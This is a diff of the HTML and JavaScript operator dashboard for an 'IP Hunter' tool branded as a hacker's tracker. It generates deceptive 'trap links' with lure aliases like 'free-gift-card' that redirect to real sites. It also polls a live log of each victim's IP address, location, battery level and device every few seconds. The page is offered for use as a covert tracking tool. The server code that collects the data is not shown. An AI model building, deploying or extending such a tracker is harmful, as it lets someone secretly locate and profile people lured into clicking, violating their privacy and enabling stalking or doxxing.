@@ -1,81 +1,58 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Nawab ZADA - IP Hunter v1.0</title>
+    <title>Nawab ZADA - Ip Hunter</title>
     <style>
-        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
-        .container { border: 2px solid #00ff00; border-radius: 15px; padding: 30px; max-width: 900px; margin: auto; box-shadow: 0 0 20px #00ff0055; }
-        h1 { text-shadow: 0 0 10px #00ff00; }
-        input { background: #111; border: 1px solid #00ff00; color: #fff; padding: 12px; width: 80%; margin-bottom: 10px; border-radius: 5px; }
-        button { background: #00ff00; color: #000; padding: 12px 25px; border: none; cursor: pointer; font-weight: bold; border-radius: 5px; }
-        .result-box { background: #111; padding: 15px; margin-top: 20px; border: 1px dashed #00ff00; word-break: break-all; }
-        table { width: 100%; border-collapse: collapse; margin-top: 30px; }
-        th, td { border: 1px solid #00ff00; padding: 12px; text-align: center; font-size: 14px; }
-        .footer { margin-top: 30px; color: #555; }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        .container { border: 2px solid #0f0; padding: 20px; border-radius: 10px; max-width: 800px; margin: auto; }
+        input { background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 90%; margin: 10px 0; }
+        button { background: #0f0; color: #000; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { border: 1px solid #0f0; padding: 8px; font-size: 12px; }
+        .res { color: cyan; font-weight: bold; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🦅 NAWAB ZADA HACKER 🦾</h1>
-        <p><i>The World's Most Advanced IP Tracker</i></p>
-        <hr color="#00ff00">
-
-        <h3>[+] GENERATE TRACKING LINK</h3>
-        <input type="text" id="targetUrl" placeholder="Enter Destination Link (e.g. https://youtube.com)"><br>
-        <input type="text" id="alias" placeholder="Custom Alias (e.g. free-gift-card)"><br>
-        <button onclick="createLink()">GENERATE LINK</button>
-
-        <div id="displayArea" class="result-box" style="display:none;">
-            <b>Your Tracking Link:</b> <br>
-            <span id="finalLink" style="color: cyan;"></span>
-        </div>
+        <h1>🦅 NAWAB ZADA IP HUNTER 🦾</h1>
+        <hr color="#0f0">
+        <h3>[+] GENERATE TRAP LINK</h3>
+        <input type="text" id="target" placeholder="Destination URL (e.g. https://youtube.com)">
+        <input type="text" id="alias" placeholder="Alias (e.g. free-net)">
+        <button onclick="gen()">CREATE LINK</button>
+        <div id="out" class="res"></div>
 
         <h3>[+] LIVE TARGET LOGS</h3>
         <table>
             <thead>
-                <tr>
-                    <th>TIME</th>
-                    <th>IP ADDRESS</th>
-                    <th>DEVICE MODEL</th>
-                    <th>BATTERY %</th>
-                </tr>
+                <tr><th>TIME</th><th>IP ADDRESS</th><th>LOCATION</th><th>BATTERY</th><th>DEVICE</th></tr>
             </thead>
-            <tbody id="logData"></tbody>
+            <tbody id="logs"></tbody>
         </table>
-
-        <p class="footer">Developer: Nawab ZADA Hacker | 2026</p>
     </div>
 
     <script>
-        function createLink() {
+        async function gen() {
+            let target = document.getElementById('target').value;
             let alias = document.getElementById('alias').value;
-            let target = document.getElementById('targetUrl').value;
-            if(!alias || !target) return alert("Fill both boxes!");
-
-            // Save target URL in database (via API)
-            fetch('/api/create', {
+            await fetch('/api/create', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ alias, target })
             });
-
-            let link = window.location.origin + "/go/" + alias;
-            document.getElementById('finalLink').innerText = link;
-            document.getElementById('displayArea').style.display = "block";
+            document.getElementById('out').innerText = "Link: " + window.location.origin + "/s/" + alias;
         }
 
-        async function updateLogs() {
+        async function fetchLogs() {
             let res = await fetch('/api/getlogs');
-            let logs = await res.json();
+            let data = await res.json();
             let html = "";
-            logs.forEach(l => {
-                html += `<tr><td>${l.time}</td><td>${l.ip}</td><td>${l.device}</td><td>${l.battery}%</td></tr>`;
+            data.forEach(l => {
+                html += `<tr><td>${l.time}</td><td>${l.ip}</td><td>${l.location}</td><td>${l.battery}</td><td>${l.device.substring(0,30)}...</td></tr>`;
             });
-            document.getElementById('logData').innerHTML = html;
+            document.getElementById('logs').innerHTML = html;
         }
-        setInterval(updateLogs, 3000);
+        setInterval(fetchLogs, 3000);
     </script>
 </body>
-          </html>
-              
+</html>
